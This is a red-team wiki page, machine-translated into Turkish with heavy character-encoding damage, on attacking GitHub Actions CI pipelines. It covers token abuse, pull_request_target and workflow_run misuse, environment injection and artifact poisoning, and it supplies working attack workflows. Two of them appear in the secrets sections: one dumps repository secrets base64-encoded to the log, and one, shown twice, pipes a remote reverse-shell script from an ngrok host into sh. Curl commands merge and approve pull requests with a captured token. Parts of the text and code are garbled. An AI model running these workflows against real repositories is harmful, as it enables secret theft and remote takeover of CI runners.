# Abusing Github Actions

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

Bu sayfada bulabileceÄŸiniz ÅŸeyler:

* Bir saldÄ±rganÄ±n bir Github Eylemine eriÅŸmeyi baÅŸardÄ±ÄŸÄ±nda **tÃ¼m etkilerin Ã¶zeti**
* Bir eyleme **eriÅŸim saÄŸlamanÄ±n farklÄ± yollarÄ±**:
* Eylemi oluÅŸturma **izinlerine** sahip olmak
* **Ã‡ekme isteÄŸi** ile ilgili tetikleyicileri **kÃ¶tÃ¼ye kullanma**
* **DiÄŸer harici eriÅŸim** tekniklerini **kÃ¶tÃ¼ye kullanma**
* Zaten ele geÃ§irilmiÅŸ bir depodan **dÃ¶nÃ¼ÅŸ yapma**
* Son olarak, bir eylemi iÃ§eriden kÃ¶tÃ¼ye kullanmak iÃ§in **son aÅŸama saldÄ±rÄ± teknikleri** bÃ¶lÃ¼mÃ¼ (belirtilen etkileri nedeniyle)

## Etkilerin Ã–zeti

[**Github Eylemleri hakkÄ±nda temel bilgilere gÃ¶z atmak iÃ§in**](../basic-github-information.md#github-actions) bir giriÅŸ yapÄ±n.

Bir **dizin** iÃ§inde **keyfi Github eylemlerini yÃ¼rÃ¼tebilir/kod enjekte edebilirseniz**, ÅŸunlarÄ± yapabilirsiniz:

* O repo/organizasyondan **sekreteri Ã§alabilirsiniz**.
* Sadece enjekte edebiliyorsanÄ±z, iÅŸ akÄ±ÅŸÄ±nda zaten bulunan her ÅŸeyi Ã§alabilirsiniz.
* AWS ve GCP gibi diÄŸer platformlara eriÅŸmek iÃ§in **repo ayrÄ±calÄ±klarÄ±nÄ± kÃ¶tÃ¼ye kullanma**.
* Ã–zel iÅŸÃ§ilerde kod **yÃ¼rÃ¼tebilirsiniz** (Ã¶zel iÅŸÃ§iler kullanÄ±lÄ±yorsa) ve oradan dÃ¶nÃ¼ÅŸ yapmaya Ã§alÄ±ÅŸabilirsiniz.
* Depo **kodunu Ã¼zerine yazabilirsiniz**.
* Bu, `GITHUB_TOKEN`'Ä±n ayrÄ±calÄ±klarÄ±na baÄŸlÄ±dÄ±r (varsa).
* **DaÄŸÄ±tÄ±mlarÄ±** ve diÄŸer **artifaktlarÄ± tehlikeye atabilirsiniz**.
* Kod bir ÅŸeyleri daÄŸÄ±tÄ±yorsa veya depoluyorsa, bunu deÄŸiÅŸtirebilir ve daha fazla eriÅŸim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" ( `${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'dan gelen) token, yÃ¶netici bu seÃ§eneÄŸi etkinleÅŸtirdiÄŸinde verilir:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github UygulamasÄ±'nÄ±n kullanacaÄŸÄ±** aynÄ± token olduÄŸundan, aynÄ± uÃ§ noktalara eriÅŸebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diÄŸer dahili getirilere eriÅŸmesine izin veren bir [**akÄ±ÅŸ**](https://github.com/github/roadmap/issues/74) yayÄ±nlamalÄ±dÄ±r.
{% endhint %}

Bu token'Ä±n olasÄ± **izinlerini** ÅŸurada gÃ¶rebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Bu token'lar iÅŸlem tamamlandÄ±ktan sonra **sÃ¼resi dolacaktÄ±r**.\
Bu token'lar ÅŸuna benzer: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceÄŸiniz bazÄ± ilginÃ§ ÅŸeyler:

{% tabs %}
{% tab title="PR BirleÅŸtir" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Onayla PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR OluÅŸtur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
BirkaÃ§ durumda, **github kullanÄ±cÄ± belirteÃ§lerini Github Actions envs iÃ§inde veya secrets iÃ§inde bulabilirsiniz**. Bu belirteÃ§ler size depo ve organizasyon Ã¼zerinde daha fazla ayrÄ±calÄ±k verebilir.
{% endhint %}

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda secrets'larÄ± listele</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>Secretlerle ters kabuk alÄ±n</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

Github Token'a verilen izinleri kontrol etmek diÄŸer kullanÄ±cÄ±larÄ±n depolarÄ±ndaki eylemlerin gÃ¼nlÃ¼klerini kontrol ederek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Ä°zin Verilen YÃ¼rÃ¼tme

{% hint style="info" %}
Bu, Github eylemlerini tehlikeye atmanÄ±n en kolay yolu olabilir, Ã§Ã¼nkÃ¼ bu durumda **kuruluÅŸta yeni bir repo oluÅŸturma eriÅŸiminiz olduÄŸu** veya bir **depoda yazma izinlerinizin** olduÄŸu varsayÄ±lmaktadÄ±r.

Bu senaryoda iseniz, [Ä°Ã§eriden bir eylem](./#post-exploitation-techniques-from-inside-an-action) ile ilgili teknikleri kontrol edebilirsiniz.
{% endhint %}

### Repo OluÅŸturmadan YÃ¼rÃ¼tme

Bir kuruluÅŸun Ã¼yeleri **yeni depolar oluÅŸturabilir** ve github eylemlerini yÃ¼rÃ¼tebilirseniz, **yeni bir repo oluÅŸturabilir ve kuruluÅŸ dÃ¼zeyinde ayarlanan sÄ±rlarÄ± Ã§alabilirsiniz**.

### Yeni Bir Åubeden YÃ¼rÃ¼tme

EÄŸer zaten yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir Github Eylemi iÃ§eren bir depoda **yeni bir ÅŸube oluÅŸturabilirseniz**, onu **deÄŸiÅŸtirebilir**, iÃ§eriÄŸi **yÃ¼kleyebilir** ve ardÄ±ndan **bu eylemi yeni ÅŸubeden yÃ¼rÃ¼tebilirsiniz**. Bu ÅŸekilde **depoyu ve kuruluÅŸ dÃ¼zeyindeki sÄ±rlarÄ± dÄ±ÅŸa aktarabilirsiniz** (ancak onlarÄ±n nasÄ±l adlandÄ±rÄ±ldÄ±ÄŸÄ±nÄ± bilmelisiniz).

DeÄŸiÅŸtirilmiÅŸ eylemi **manuel olarak** yÃ¼rÃ¼tme yapabilirsiniz, bir **PR oluÅŸturulduÄŸunda** veya **bazÄ± kodlar itildiÄŸinde** (ne kadar gÃ¼rÃ¼ltÃ¼lÃ¼ olmak istediÄŸinize baÄŸlÄ± olarak):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## Forked Execution

{% hint style="info" %}
FarklÄ± tetikleyiciler vardÄ±r ki bunlar bir saldÄ±rganÄ±n **baÅŸka bir depodaki bir Github Eylemini yÃ¼rÃ¼tmesine izin verebilir**. EÄŸer bu tetiklenebilir eylemler kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir saldÄ±rgan bunlarÄ± tehlikeye atabilir.
{% endhint %}

### `pull_request`

Ã‡alÄ±ÅŸma tetikleyici **`pull_request`**, bir Ã§ekme isteÄŸi alÄ±ndÄ±ÄŸÄ±nda Ã§alÄ±ÅŸma akÄ±ÅŸÄ±nÄ± her zaman yÃ¼rÃ¼tÃ¼r, bazÄ± istisnalarla: varsayÄ±lan olarak, **ilk kez iÅŸbirliÄŸi yaptÄ±ÄŸÄ±nÄ±zda**, bir **bakÄ±m** kiÅŸisinin iÅŸ akÄ±ÅŸÄ±nÄ±n **Ã§alÄ±ÅŸmasÄ±nÄ± onaylamasÄ±** gerekecektir:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
VarsayÄ±lan sÄ±nÄ±rlama **ilk kez** katkÄ±da bulunanlar iÃ§indir, bir **geÃ§erli hata/yazÄ±m hatasÄ±nÄ± dÃ¼zeltip** ardÄ±ndan yeni `pull_request` ayrÄ±calÄ±klarÄ±nÄ±zÄ± **kÃ¶tÃ¼ye kullanmak iÃ§in diÄŸer PR'lar gÃ¶nderebilirsiniz**.

**Bunu test ettim ve iÅŸe yaramÄ±yor**: ~~BaÅŸka bir seÃ§enek, projeye katkÄ±da bulunan ve hesabÄ±nÄ± silen birinin adÄ±yla bir hesap oluÅŸturmak olabilir.~~
{% endhint %}

AyrÄ±ca, varsayÄ±lan olarak **hedef depoya yazma izinlerini** ve **secrets eriÅŸimini** engeller, [**belgelerde**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) belirtildiÄŸi gibi:

> `GITHUB_TOKEN` hariÃ§, bir iÅŸ akÄ±ÅŸÄ± bir **Ã§atallanmÄ±ÅŸ** depodan tetiklendiÄŸinde **secrets'lar Ã§alÄ±ÅŸtÄ±rÄ±cÄ±ya iletilmez**. **`GITHUB_TOKEN` Ã§ekme isteklerinde yalnÄ±zca okuma izinlerine sahiptir**.

Bir saldÄ±rgan, Github Eyleminin tanÄ±mÄ±nÄ± deÄŸiÅŸtirerek keyfi ÅŸeyler yÃ¼rÃ¼tmek ve keyfi eylemler eklemek iÃ§in deÄŸiÅŸtirebilir. Bununla birlikte, belirtilen sÄ±nÄ±rlamalar nedeniyle sÄ±rlarÄ± Ã§alamayacak veya depoyu Ã¼zerine yazamayacaktÄ±r.

{% hint style="danger" %}
**Evet, saldÄ±rgan PR'de tetiklenecek github eylemini deÄŸiÅŸtirirse, Github Eylemi kullanÄ±lan eylem o olacaktÄ±r ve orijin depodan deÄŸil!**
{% endhint %}

SaldÄ±rganÄ±n yÃ¼rÃ¼tÃ¼len kodu da kontrol ettiÄŸi iÃ§in, `GITHUB_TOKEN` Ã¼zerinde sÄ±rlar veya yazma izinleri olmasa bile, bir saldÄ±rgan Ã¶rneÄŸin **zararlÄ± dosyalar yÃ¼kleyebilir**.

### **`pull_request_target`**

Ã‡alÄ±ÅŸma tetikleyici **`pull_request_target`**, hedef depoya **yazma izni** ve **secrets eriÅŸimi** (ve izin istemez).

Ã‡alÄ±ÅŸma tetikleyici **`pull_request_target`**'Ä±n **temel baÄŸlamda** Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve PR tarafÄ±ndan verilen baÄŸlamda deÄŸil olduÄŸunu **(gÃ¼vensiz kodlarÄ± yÃ¼rÃ¼tmekten kaÃ§Ä±nmak iÃ§in)** unutmayÄ±n. `pull_request_target` hakkÄ±nda daha fazla bilgi iÃ§in [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target) bakÄ±n.\
AyrÄ±ca, bu belirli tehlikeli kullanÄ±m hakkÄ±nda daha fazla bilgi iÃ§in bu [**github blog yazÄ±sÄ±na**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) bakÄ±n.

**YÃ¼rÃ¼tÃ¼len iÅŸ akÄ±ÅŸÄ±nÄ±n** temelde tanÄ±mlanan ve PR'de deÄŸil olan bir iÅŸ akÄ±ÅŸÄ± olduÄŸu iÃ§in **`pull_request_target`**'Ä±n **gÃ¼venli** olduÄŸu dÃ¼ÅŸÃ¼nÃ¼lebilir, ancak **bazÄ± durumlarda deÄŸildir**.

Ve bu, **secrets eriÅŸimine** sahip olacaktÄ±r.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyici, `tamamlandÄ±ÄŸÄ±nda`, `istendiÄŸinde` veya `devam ederken` farklÄ± bir iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmayÄ± saÄŸlar.

Bu Ã¶rnekte, ayrÄ± "Testleri Ã‡alÄ±ÅŸtÄ±r" iÅŸ akÄ±ÅŸÄ±nÄ±n tamamlandÄ±ktan sonra bir iÅŸ akÄ±ÅŸÄ±nÄ±n nasÄ±l yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±:

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

AyrÄ±ca, belgelere gÃ¶re: `workflow_run` olayÄ± tarafÄ±ndan baÅŸlatÄ±lan iÅŸ akÄ±ÅŸÄ±, **Ã¶nceki iÅŸ akÄ±ÅŸÄ± olmasa bile gizli bilgilere eriÅŸebilir ve belirteÃ§ler yazabilir**.

Bu tÃ¼r bir iÅŸ akÄ±ÅŸÄ±, dÄ±ÅŸ bir kullanÄ±cÄ± tarafÄ±ndan **`pull_request`** veya **`pull_request_target`** aracÄ±lÄ±ÄŸÄ±yla tetiklenebilen bir **iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ±ysa** saldÄ±rÄ±ya uÄŸrayabilir. BirkaÃ§ zayÄ±f Ã¶rnek [bu blogda bulunabilir](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability). Ä°lk Ã¶rnek, saldÄ±rganÄ±n kodunu indiren **`workflow_run`** tetiklenmiÅŸ iÅŸ akÄ±ÅŸÄ±dÄ±r: `${{ github.event.pull_request.head.sha }}`\
Ä°kinci Ã¶rnek, gÃ¼vensiz kodun bir **artefaktÄ±** **`workflow_run`** iÅŸ akÄ±ÅŸÄ±na geÃ§irmesi ve bu artefaktÄ±n iÃ§eriÄŸini kullanarak RCE'ye karÅŸÄ± savunmasÄ±z hale getirmesidir.

### `workflow_call`

YAPILACAKLAR

YAPILACAKLAR: Ã‡alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda pull\_request'dan kullanÄ±lan/indirilen kodun orijinalden mi yoksa Ã§atal PR'den mi olduÄŸunu kontrol edin

## Ã‡atal YÃ¼rÃ¼tme KÃ¶tÃ¼ye KullanÄ±mÄ±

DÄ±ÅŸ bir saldÄ±rganÄ±n bir GitHub iÅŸ akÄ±ÅŸÄ±nÄ± yÃ¼rÃ¼tmeyi baÅŸarabileceÄŸi tÃ¼m yollarÄ± belirttik, ÅŸimdi bu yÃ¼rÃ¼tmelerin, yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine bakalÄ±m:

### GÃ¼vensiz kontrol yÃ¼rÃ¼tme

**`pull_request`** durumunda, iÅŸ akÄ±ÅŸÄ± **PR baÄŸlamÄ±nda yÃ¼rÃ¼tÃ¼lecek** (bu nedenle **kÃ¶tÃ¼ niyetli PR'lerin kodunu yÃ¼rÃ¼tecek**), ancak Ã¶nce **izin verilmesi gereken** ve bazÄ± [kÄ±sÄ±tlamalarla](./#pull\_request) Ã§alÄ±ÅŸacaktÄ±r.

**`pull_request_target` veya `workflow_run`** kullanan bir iÅŸ akÄ±ÅŸÄ±, **`pull_request_target` veya `pull_request`** tarafÄ±ndan tetiklenebilen bir iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ±ysa, orijinal depodan kod Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, bu nedenle **saldÄ±rgan yÃ¼rÃ¼tÃ¼len kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, **eylemin** bir **aÃ§Ä±k PR kontrolÃ¼** varsa ve bu kontrol **kodu PR'den alacak** (ve temel deÄŸil), saldÄ±rganÄ±n kontrol ettiÄŸi kodu kullanacaktÄ±r. Ã–rneÄŸin (PR kodunun indirildiÄŸi 12. satÄ±ra bakÄ±n):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÃœVENÄ°LÄ°R DEÄÄ°L. Sadece bir Ã¶rnek olarak saÄŸlanmÄ±ÅŸtÄ±r.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potansiyel olarak **gÃ¼vensiz kod, `npm install` veya `npm build` sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmaktadÄ±r** Ã§Ã¼nkÃ¼ derleme komut dosyalarÄ± ve referans **paketler PR'nin yazarÄ± tarafÄ±ndan kontrol edilmektedir**.

{% hint style="warning" %}
KullanÄ±labilecek zayÄ±f eylemleri aramak iÃ§in bir github dork'u: `event.pull_request pull_request_target extension:yml` ancak, eylemin yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ olsa bile iÅŸlerin gÃ¼venli bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi iÃ§in farklÄ± yapÄ±landÄ±rma yÃ¶ntemleri vardÄ±r (Ã¶rneÄŸin, PR'yi oluÅŸturan aktÃ¶r hakkÄ±nda koÅŸullu kullanÄ±m).
{% endhint %}

### BaÄŸlam Betik EnjeksiyonlarÄ± <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github baÄŸlamlarÄ±**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) kullanÄ±cÄ±nÄ±n oluÅŸturduÄŸu **verilerle kontrol edilen** belirli baÄŸlamlar vardÄ±r. EÄŸer github eylemi bu **verileri yÃ¼rÃ¼tmek iÃ§in kullanÄ±yorsa**, bu, **keyfi kod yÃ¼rÃ¼tme**'ye yol aÃ§abilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Betik Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir **Ã§evre deÄŸiÅŸkenini** tanÄ±mlayarak veya gÃ¼ncelleyerek ve bunu **`GITHUB_ENV`** Ã§evre dosyasÄ±na yazarak, bir iÅŸ akÄ±ÅŸÄ± gÃ¶revindeki sonraki adÄ±mlarda **Ã§evre deÄŸiÅŸkenini kullanÄ±labilir hale getirebilirsiniz**.

Bir saldÄ±rgan bu **env** deÄŸiÅŸkenine herhangi bir deÄŸer **enjekte edebilirse**, ardÄ±ÅŸÄ±k adÄ±mlarda **LD\_PRELOAD** veya **NODE\_OPTIONS** gibi kodlarÄ± yÃ¼rÃ¼tebilecek env deÄŸiÅŸkenlerini enjekte edebilir.

Ã–rneÄŸin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), yÃ¼klenen bir artefaktÄ±n iÃ§eriÄŸini **`GITHUB_ENV`** env deÄŸiÅŸkenine depolamak iÃ§in gÃ¼venen bir iÅŸ akÄ±ÅŸÄ±nÄ± hayal edin. Bir saldÄ±rgan bunu tehlikeye atmak iÃ§in ÅŸuna benzer bir ÅŸey yÃ¼kleyebilir:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### ZayÄ±f ÃœÃ§Ã¼ncÃ¼ Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**Bu blog yazÄ±sÄ±nda**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiÄŸi gibi, bu Github Eylemi farklÄ± iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan artefaklara eriÅŸim saÄŸlar.

Sorun ÅŸudur ki, **`path`** parametresi ayarlanmazsa, artefakt mevcut dizine Ã§Ä±karÄ±lÄ±r ve daha sonra kullanÄ±labilecek dosyalarÄ± geÃ§ersiz kÄ±labilir veya hatta iÅŸ akÄ±ÅŸÄ±nda yÃ¼rÃ¼tÃ¼lebilir dosyalarÄ± geÃ§ersiz kÄ±labilir. Bu nedenle, Artefakt savunmasÄ±zsa, bir saldÄ±rgan bu durumu kÃ¶tÃ¼ye kullanarak, Artefakte gÃ¼venen diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± tehlikeye atabilir.

ZayÄ±f iÅŸ akÄ±ÅŸÄ± Ã¶rneÄŸi:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

Bu iÅŸ akÄ±ÅŸÄ± ile saldÄ±rÄ± gerÃ§ekleÅŸtirilebilir:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## DiÄŸer Harici EriÅŸim

### Silinen Ad AlanÄ± Repo KaÃ§Ä±rma

Bir hesap adÄ±nÄ± deÄŸiÅŸtirdiÄŸinde baÅŸka bir kullanÄ±cÄ± bir sÃ¼re sonra o adÄ± kullanarak bir hesap kaydedebilir. EÄŸer bir depo **adÄ± deÄŸiÅŸmeden Ã¶nce 100'den az yÄ±ldÄ±za sahipse**, Github yeni kayÄ±tlÄ± kullanÄ±cÄ±nÄ±n silinen depo ile aynÄ± adÄ± oluÅŸturmasÄ±na izin verecektir.

{% hint style="danger" %}
Bu nedenle, bir eylem bir mevcut olmayan hesaptan bir depo kullanÄ±yorsa, hala bir saldÄ±rganÄ±n o hesabÄ± oluÅŸturup eylemi tehlikeye atabileceÄŸi mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

EÄŸer diÄŸer depolar **bu kullanÄ±cÄ± depolarÄ±ndan baÄŸÄ±mlÄ±lÄ±klar kullanÄ±yorsa**, bir saldÄ±rgan bunlarÄ± ele geÃ§irebilir. Daha kapsamlÄ± bir aÃ§Ä±klama iÃ§in ÅŸuraya bakabilirsiniz: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo DÃ¶nÃ¼ÅŸÃ¼mÃ¼

{% hint style="info" %}
Bu bÃ¶lÃ¼mde, birinciye eriÅŸimimiz olduÄŸunu varsayarak **bir depodan diÄŸerine dÃ¶nÃ¼ÅŸÃ¼m yapmamÄ±zÄ± saÄŸlayacak tekniklerden** bahsedeceÄŸiz (Ã¶nceki bÃ¶lÃ¼me bakÄ±n).
{% endhint %}

### Ã–nbellek Zehirlenmesi

Bir Ã¶nbellek **aynÄ± dalda Ã§alÄ±ÅŸan iÅŸ akÄ±ÅŸlarÄ± arasÄ±nda korunur**. Bu, bir saldÄ±rganÄ±n bir **paket** ele geÃ§irirse ve daha sonra Ã¶nbelleÄŸe kaydedilip **daha yetkili** bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan indirilip ve yÃ¼rÃ¼tÃ¼lÃ¼rse, o iÅŸ akÄ±ÅŸÄ±nÄ± da **tehlikeye atabileceÄŸi** anlamÄ±na gelir.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Sanal Nesne Zehirlenmesi

Ä°ÅŸ akÄ±ÅŸlarÄ± **diÄŸer iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan sanal nesneleri** kullanabilir, bir saldÄ±rganÄ±n daha sonra baÅŸka bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan kullanÄ±lan bir sanal nesneyi yÃ¼kleyen Github Eylemini **ele geÃ§irmesi** durumunda, diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± da **tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Eylem SonrasÄ± SÃ¶mÃ¼rÃ¼

### AWS ve GCP'ye OIDC AracÄ±lÄ±ÄŸÄ±yla EriÅŸim

AÅŸaÄŸÄ±daki sayfalara bakÄ±n:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### SÄ±rlara EriÅŸim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir betiÄŸe iÃ§erik enjekte ediyorsanÄ±z, sÄ±rlara nasÄ±l eriÅŸebileceÄŸinizi bilmek ilginÃ§ olabilir:

* EÄŸer sÄ±r veya belirteÃ§ bir **Ã§evre deÄŸiÅŸkenine** ayarlanmÄ±ÅŸsa, **`printenv`** kullanarak doÄŸrudan Ã§evrede eriÅŸilebilir.

<details>

<summary>Github Eylem Ã§Ä±ktÄ±sÄ±nda sÄ±rlarÄ± listele</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>SÄ±rlarla ters kabuk alÄ±n</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

